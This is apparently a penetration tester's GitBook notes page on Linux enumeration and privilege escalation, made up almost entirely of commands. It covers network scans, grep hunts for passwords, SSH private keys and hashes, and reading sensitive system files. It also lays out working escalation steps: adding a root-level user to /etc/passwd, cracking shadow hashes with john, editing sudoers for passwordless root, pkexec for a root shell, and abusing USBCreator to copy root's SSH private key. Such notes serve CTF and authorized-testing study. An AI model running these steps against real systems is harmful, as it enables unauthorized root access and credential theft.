---
icon: stethoscope
---

# Enumeration

{% embed url="https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html" %}

<details>

<summary><mark style="color:purple;"><strong><code>Basic</code></strong></mark></summary>

{% code title="Check user permissions" %}
```bash
sudo -l
```
{% endcode %}

{% code title="User with shells" %}
```sh
grep "sh$" /etc/passwd
```
{% endcode %}

{% code title="Check hostname" %}
```sh
hostname -I
```
{% endcode %}

{% code title="Check the internal network" %}
```sh
ifconfig
```
{% endcode %}

{% code title="Check mounted devices" %}
```sh
mount
```
{% endcode %}

{% code title="Container processes " lineNumbers="true" %}
```sh
ps auxww | grep docker
ps auxww | grep lxd
```
{% endcode %}

{% code title="Read crontab file" %}
```sh
cat /etc/crontab
```
{% endcode %}

{% code title="Check Services running" %}
```sh
ls /etc/init.d
```
{% endcode %}

{% code title="Check System info" %}
```sh
uname -a
```
{% endcode %}

{% code title="Check groups file" %}
```powershell
cat /etc/group
```
{% endcode %}

{% code title="Show listening ports" %}
```sh
netstat -tuln
```
{% endcode %}

{% code title="Listen to the localhost" %}
```sh
netstat -an -p tcp
```
{% endcode %}

{% code title="Check binaries with capabilities" %}
```sh
getcap -r / 2>/dev/null
```
{% endcode %}

{% code title="SUID/SETGID binaries" %}
```sh
find / -perm -4000 -or -perm -2000 2>/dev/null
```
{% endcode %}

{% code title=" Traces library function calls" overflow="wrap" %}
```sh
ltrace ProgramName
```
{% endcode %}

{% code title="Search Kernel for Exploits" %}
```sh
searchsploit "Linux Kernel" | grep <version>
```
{% endcode %}

</details>

<details>

<summary><mark style="color:purple;"><strong><code>Scan the local network</code></strong></mark></summary>

* <mark style="color:purple;">Find one many hosts there are in the network by doing a</mark> <mark style="color:orange;">**`ping sweep`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" %}
```sh
for i in {1..254}; do (ping -c 1 192.168.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```
{% endcode %}

* <mark style="color:purple;">If</mark> <mark style="color:orange;">**`nc`**</mark> <mark style="color:purple;">is installed can be use to scan for open ports:</mark>

{% code overflow="wrap" %}
```sh
nc -zv 192.168.0.1 1-65535 2>&1 | grep -v refused | tee scan
```
{% endcode %}

{% code title="UDP scan" overflow="wrap" %}
```sh
nc -uzv 192.168.0.1 1-65535 2>&1 | grep -v refused
```
{% endcode %}

#### [<kbd><mark style="color:orange;">Nmap Binary<mark style="color:orange;"></kbd>](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64)

</details>

<details>

<summary><mark style="color:purple;"><strong><code>Credential Hunting</code></strong></mark></summary>

{% hint style="info" %}


#### <mark style="color:orange;">`grep`</mark>

* <mark style="color:purple;">Search for the string</mark> <mark style="color:orange;">**`pass`**</mark> <mark style="color:purple;">(case-insensitive) in all files and directories recursively:</mark>

{% code overflow="wrap" %}
```sh
grep -iR "pass" * 2>/dev/null
```
{% endcode %}

* <mark style="color:purple;">Search for</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**the string**</mark>**&#x20;**<mark style="color:orange;">**`password`**</mark> <mark style="color:purple;">in files with double extension, recursively:</mark>

```sh
grep password .*.* -r 2>/dev/null
```

* <mark style="color:purple;">Search for</mark> <mark style="color:orange;">**`ssh`**</mark> <mark style="color:purple;">keys recursively from the current directory you are in:</mark>

{% code overflow="wrap" %}
```sh
grep -iR -E "(ssh-(rsa|ed25519|dss|ecdsa|rsa1)[ ]+[A-Za-z0-9+/=]+|-----BEGIN [A-Z ]+PRIVATE KEY-----)" * 2>/dev/null
```
{% endcode %}

* <mark style="color:purple;">Is also possible to look for</mark> <mark style="color:orange;">**`hashes`**</mark> <mark style="color:purple;">by using regex to look for the hash length:</mark>

{% code title="MD5 hashes" %}
```sh
grep -aPo '[a-fA-F0-9]{32}' /DESIRED/PATH
```
{% endcode %}

{% code title="SHA-1" %}
```sh
grep -aPo '[a-fA-F0-9]{40}' /DESIRED/PATH
```
{% endcode %}

{% code title="SHA-256" %}
```sh
grep -aPo '[a-fA-F0-9]{64}' /DESIRED/PATH
```
{% endcode %}

{% code title="SHA-512" %}
```sh
grep -aPo '[a-fA-F0-9]{128}' /DESIRED/PATH
```
{% endcode %}
{% endhint %}

</details>

<details>

<summary><mark style="color:purple;"><strong><code>Important Files</code></strong></mark></summary>

{% hint style="info" %}


#### <mark style="color:orange;">`/etc/passwd`</mark>

* <mark style="color:purple;">If is possible to write the file:</mark>

{% code title="Generate the password hash" overflow="wrap" %}
```sh
openssl passwd -1 tokyo
```
{% endcode %}

{% code title="Add the line " overflow="wrap" %}
```sh
echo 'tokyo:$1$iLayOiAd$8dHGiU.Qvk/uqjnoWzRpm/:0:0:tokyo:/root:/bin/bash' >> passwd
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}


### <mark style="color:orange;">`/etc/shadow`</mark>

{% code title="Create the Hash file" overflow="wrap" %}
```sh
echo 'zoe:$y$j9T$Ct0y5TNQ/sv95CFPz510O/$7YtCDOBISfngZeQ3rsDkRcw2XTFDgHBkxDpuhyBLNO1:1002:1002:zoe:/home/zoe:/bin/bash' > shadowHash.txt
```
{% endcode %}

{% code title="Crack the hash" overflow="wrap" %}
```sh
john --wordlist=~/Documents/Wordlists/rockyou.txt shadow.txt --format=crypt
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}


### <mark style="color:orange;">**`/var/log`**</mark>

* <mark style="color:orange;">**`adm`**</mark> <mark style="color:purple;">group can read log files.</mark>
{% endhint %}

***

{% hint style="info" %}


#### <mark style="color:orange;">**`/etc/sudoers`**</mark>

{% code title="Try to read it" %}
```sh
cat /etc/sudoers
```
{% endcode %}

* <mark style="color:purple;">If the file is read-only, you need to change its permissions to allow write access:</mark>

```sh
chmod +w /etc/sudoers
```

* <mark style="color:purple;">Add the following line:</mark>

```
yourUser   ALL=(ALL) NOPASSWD: ALL
```

* <mark style="color:purple;">Restore the original file permissions to make it read-only again:</mark>

```sh
chmod 440 /mnt/etc/sudoers
```
{% endhint %}

</details>

<details>

<summary><mark style="color:orange;"><strong><code>Polkit</code></strong></mark></summary>

{% code title="Check policy" overflow="wrap" %}
```sh
cat /etc/polkit-1/localauthority.conf.d
```
{% endcode %}

{% code title="Become root" overflow="wrap" %}
```sh
pkexec "/bin/sh"
```
{% endcode %}

</details>

<details>

<summary><mark style="color:orange;"><strong><code>USBCreator</code></strong></mark></summary>

* <mark style="color:purple;">Allows to over write files with</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">permissions:</mark>

{% code title="Copy root private key" overflow="wrap" %}
```sh
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true
```
{% endcode %}

</details>
